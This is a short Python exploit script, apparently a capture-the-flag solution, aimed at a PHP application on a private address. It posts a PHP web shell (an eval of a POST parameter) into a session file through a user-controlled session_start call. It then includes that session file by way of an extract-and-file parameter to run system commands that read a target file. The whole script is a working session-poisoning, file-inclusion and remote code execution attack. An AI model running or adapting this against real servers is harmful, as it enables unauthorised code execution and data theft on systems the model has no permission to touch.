#encoding:utf-8
import requests
session = requests.Session()
cookies = {"PHPSESSID":"l86epsjlkte51fu6gp4dr9eir3"}
headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Linux; Android 9.0; Z832 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","DNT":"1","Content-Type":"application/x-www-form-urlencoded"}


def write_sess(target=''):
    paramsGet = {"save_path":"/tmp","function":"session_start"}
    paramsPost = {"name":"<?php echo 'helloworld';@eval(\x24_POST['test']);?>"}
    response = session.post(target+"/index.php", data=paramsPost, params=paramsGet, headers=headers, cookies=cookies)
    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)

def include_sess(target='', file_pre=''):
    # file_pre = "/tmp/sessions/"
    file_pre = "/tmp/"
    paramsGet = {"file": file_pre + "sess_l86epsjlkte51fu6gp4dr9eir3", "function": "extract"}
    paramsPost = {"test": "echo system('cat sdjbhudfhuahdjkasndjkasnbdfdf.php');"}
    response = session.post(target + "/index.php", data=paramsPost, params=paramsGet, headers=headers)
    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)
    if "helloworld" in response.content:
        print '[+] success~!!!!'
    if "test6666" in response.content:
        print('[+] success!')
        # print(response.content)


target = "http://10.99.99.16"
write_sess(target)
include_sess(target)
